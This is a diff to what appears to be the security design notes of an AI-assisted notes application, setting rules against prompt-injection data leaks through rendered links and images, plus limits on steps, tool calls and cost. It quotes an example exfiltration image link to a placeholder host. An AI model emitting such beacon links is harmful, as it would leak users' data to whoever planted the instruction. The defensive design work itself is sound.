@@ -69,7 +69,12 @@ a write or an outside effect.
    `[1]: https://…`) and HTML `<img>`/`<a>`. This closes the rendering-beacon
    class: the desktop CSP allows `img-src https:`, so an injected
    `![](https://host/?d=…)` would otherwise fire on display, past the send
-   overview.
+   overview. For what the session stores on a model's behalf — a suggestion
+   round, a transcript, a reply in a comment thread — "allowed" is not a
+   domain at all: an address stays live only where the user's own text
+   already carries it character for character. Allowing its host would let
+   the model hang data onto a host a note merely mentions, and the note is
+   where an injected instruction comes from.
 7. **Guardrails.** Limits for steps, tool calls, tokens and cost with a
    warning at 80 %; a loop guard for repeated identical calls; a circuit
    breaker after three errors; STOP at any time — an abort in the middle of a
